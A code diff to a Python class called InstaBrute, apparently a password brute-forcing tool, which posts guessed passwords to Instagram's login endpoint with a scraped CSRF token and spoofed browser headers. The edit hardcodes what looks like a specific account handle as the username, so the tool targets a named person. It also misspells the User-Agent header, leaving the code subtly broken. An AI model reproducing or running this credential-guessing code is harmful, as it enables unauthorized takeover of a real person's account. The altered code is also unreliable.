@@ -65,7 +65,7 @@ class InstaBrute(object):
         time = int(datetime.now().timestamp())
 
         payload = {
-            'username': user,
+            'username': samira_sofia24,
             'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
             'queryParams': {},
             'optIntoOneTap': 'false'
@@ -75,7 +75,7 @@ class InstaBrute(object):
             r = s.get(link)
             csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
             r = s.post(login_url, data=payload, headers={
-                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
+                "User-Aygent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
                 "Referer": "https://www.instagram.com/accounts/login/",
                 "x-csrftoken": csrf
